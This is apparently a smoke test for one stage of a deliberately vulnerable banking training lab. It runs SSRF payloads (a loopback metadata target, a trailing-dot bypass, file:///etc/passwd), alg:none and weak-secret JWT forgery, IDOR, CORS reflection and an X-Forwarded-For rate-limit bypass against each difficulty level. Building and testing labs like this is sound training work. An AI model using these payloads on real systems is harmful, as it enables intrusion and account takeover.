"""Stage 6 smoke test — e-wallet webhook (SSRF) and /api/v1 (JWT, CORS, rate limit).

Runs every lab level against a throwaway copy of the seeded database and a live
loopback server, so the server-side fetch really leaves the process.
"""

import json
import os
import re
import shutil
import socket
import sqlite3
import sys
import tempfile
import threading

import jwt
import requests
import werkzeug.serving

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, ROOT)

SRC_DB = os.path.join(ROOT, "db", "nusabank.db")
PW = "password"


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def make_client(level, tmpdir):
    db_copy = os.path.join(tmpdir, f"nusabank-{level}.db")
    shutil.copyfile(SRC_DB, db_copy)
    uploads = os.path.join(tmpdir, f"uploads-{level}")
    shutil.copytree(os.path.join(ROOT, "uploads"), uploads, dirs_exist_ok=True)
    os.environ.update(LAB_LEVEL=level, NUSABANK_DB=db_copy,
                      NUSABANK_UPLOADS=uploads, NUSABANK_COOKIE_SECURE="0")
    from app import create_app

    app = create_app({"DB_PATH": db_copy, "UPLOAD_DIR": uploads})
    return app, db_copy


def login(c, username="budi01", password=PW):
    return c.post("/login", data={"username": username, "password": password},
                  follow_redirects=False)


def csrf_token(client, path="/wallet"):
    body = client.get(path).data.decode("utf-8", "replace")
    m = re.search(r'name="csrf_token" value="([^"]+)"', body)
    return m.group(1) if m else "nusabank-csrf-static-token"


def raw(db_path, sql, params=()):
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    try:
        return conn.execute(sql, params).fetchall()
    finally:
        conn.close()


def connect_wallet(client, url):
    token = csrf_token(client)
    resp = client.post("/wallet", data={"label": "DompetKu", "url": url,
                                        "csrf_token": token})
    return resp


def api(client, path, token=None, method="GET", **kwargs):
    headers = kwargs.pop("headers", {})
    if token:
        headers["Authorization"] = f"Bearer {token}"
    return client.open(path, method=method, headers=headers, **kwargs)


def run(level):
    tmpdir = tempfile.mkdtemp(prefix=f"stage6-{level}-")
    app, db_path = make_client(level, tmpdir)
    client = app.test_client()
    assert login(client).status_code in (302, 303), "login failed"

    # Fresh rate-limit state for this level.
    from app.security import _RATE
    _RATE.clear()

    out = {"level": level}

    # --- Live loopback server (target of the SSRF) -----------------------
    port = free_port()
    server = werkzeug.serving.make_server("127.0.0.1", port, app, threaded=True)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    base = f"http://127.0.0.1:{port}"
    try:
        # 1) Direct loopback target ---------------------------------------
        resp = connect_wallet(client, f"{base}/internal/metadata")
        body = resp.data.decode("utf-8", "replace")
        out["ssrf_direct_flag"] = "FLAG{ssrf_internal_metadata_reached}" in body
        out["ssrf_direct_status"] = resp.status_code

        # 2) Trailing-dot hostname (bypasses a string blacklist) ----------
        resp = connect_wallet(client, f"http://localhost.:{port}/internal/metadata")
        body = resp.data.decode("utf-8", "replace")
        out["ssrf_dot_flag"] = "FLAG{ssrf_internal_metadata_reached}" in body

        # 3) Non-http scheme: never fetches (requests refuses it), but easy
        #    leaks the exception class via verbose_errors; medium blacklists
        #    the literal; hard/patched reject it on scheme alone.
        resp = connect_wallet(client, "file:///etc/passwd")
        body = resp.data.decode("utf-8", "replace")
        out["scheme_status"] = resp.status_code
        out["scheme_leak"] = "InvalidSchema" in body

        # 4) Legit partner endpoint ---------------------------------------
        #    It lives on loopback, so only easy/medium reach it unmodified.
        partner = f"{base}/wallet/partner"
        resp = connect_wallet(client, partner)
        body = resp.data.decode("utf-8", "replace")
        out["partner_status"] = resp.status_code
        out["ssrf_partner_ok"] = "Permintaan diterima" in body

        # 5) Allowlist path: an operator can trust a partner host explicitly
        #    (settings.webhook_allowlist), which is how hard/patched stay usable.
        if not out["ssrf_partner_ok"]:
            conn = sqlite3.connect(db_path)
            conn.execute(
                "INSERT INTO settings(key, value) VALUES('webhook_allowlist', ?) "
                "ON CONFLICT(key) DO UPDATE SET value = excluded.value",
                ("partner.nusabank.example.com,127.0.0.1",),
            )
            conn.commit()
            conn.close()
            resp = connect_wallet(client, partner)
            body = resp.data.decode("utf-8", "replace")
            out["partner_allowlisted"] = "Permintaan diterima" in body
        else:
            out["partner_allowlisted"] = None
        # The fetched partner page is embedded inside <pre>, so Jinja escapes
        # its quotes as &#34; — match the escaped form too.
        def _signature_marker(body, value):
            return (f'data-signature="{value}"' in body
                    or f"data-signature=&#34;{value}&#34;" in body)

        out["webhook_signed"] = _signature_marker(body, "valid")
        out["webhook_unsigned"] = _signature_marker(body, "none")
    finally:
        server.shutdown()
        thread.join(timeout=5)

    # --- REST API ---------------------------------------------------------
    r = client.post("/api/v1/auth/token",
                    json={"username": "budi01", "password": PW})
    out["token_status"] = r.status_code
    token = (r.get_json() or {}).get("access_token")

    if token:
        r = api(client, "/api/v1/profile", token)
        out["profile_status"] = r.status_code
        out["profile_has_email"] = "budi01@example.com" in r.data.decode()

    # alg:none impersonation of user id 1
    none_tok = jwt.encode({"sub": "1", "role": "admin", "username": "admin"},
                          None, algorithm="none")
    if isinstance(none_tok, bytes):
        none_tok = none_tok.decode()
    r = api(client, "/api/v1/profile?user_id=1", none_tok)
    out["alg_none_status"] = r.status_code
    data = r.get_json() or {}
    out["alg_none_admin"] = data.get("profile", {}).get("username") == "admin"

    # weak secret forgery
    forged = jwt.encode({"sub": "1", "role": "admin"}, "nusabank123",
                        algorithm="HS256")
    r = api(client, "/api/v1/profile", forged)
    out["weak_secret_status"] = r.status_code

    # IDOR across accounts (budi01 is user 4; every other account is foreign)
    rows = raw(db_path, "SELECT id, user_id FROM accounts ORDER BY id")
    mine = next(a["id"] for a in rows if a["user_id"] == 4)
    other = next(a["id"] for a in rows if a["user_id"] != 4)
    r = api(client, f"/api/v1/balance?account_id={other}", token)
    out["balance_other_own"] = r.status_code
    r = api(client, f"/api/v1/balance?account_id={mine}", token)
    out["balance_mine"] = r.status_code

    # CORS reflection
    r = client.get("/api/v1/ping", headers={"Origin": "https://evil.example"})
    out["cors_acao"] = r.headers.get("Access-Control-Allow-Origin")
    out["cors_creds"] = r.headers.get("Access-Control-Allow-Credentials")

    # Rate limit: 12 failed logins in a row
    statuses = []
    for _ in range(12):
        statuses.append(client.post(
            "/api/v1/auth/token", json={"username": "budi01", "password": "salah"}
        ).status_code)
    out["rate_limited"] = 429 in statuses
    out["rate_statuses"] = statuses[:3] + statuses[-2:]

    # Rate limit bypass via rotating X-Forwarded-For (hard flaw)
    _RATE.clear()
    statuses = []
    for i in range(12):
        statuses.append(client.post(
            "/api/v1/auth/token",
            json={"username": "budi01", "password": "salah"},
            headers={"X-Forwarded-For": f"10.9.9.{i}"},
        ).status_code)
    out["rate_bypass_xff"] = 429 not in statuses

    # Enumeration signal (fresh bucket, otherwise we just see the limiter)
    _RATE.clear()
    r = client.post("/api/v1/auth/token",
                    json={"username": "tidak_ada_user", "password": "x"})
    out["enum_code"] = (r.get_json() or {}).get("code")

    # Dashboard IDOR regression
    r = client.get(f"/dashboard?account_id={other}")
    out["dashboard_other"] = r.status_code

    print(json.dumps(out, indent=2, ensure_ascii=False))
    return out


def main():
    results = {}
    for level in ("easy", "medium", "hard", "patched"):
        try:
            results[level] = run(level)
        except Exception as exc:  # noqa: BLE001
            import traceback
            traceback.print_exc()
            results[level] = {"level": level, "error": repr(exc)}

    print("\n=== SUMMARY ===")
    for level, data in results.items():
        print(level, "->", json.dumps(
            {k: v for k, v in data.items() if k != "level"}, ensure_ascii=False))


if __name__ == "__main__":
    main()
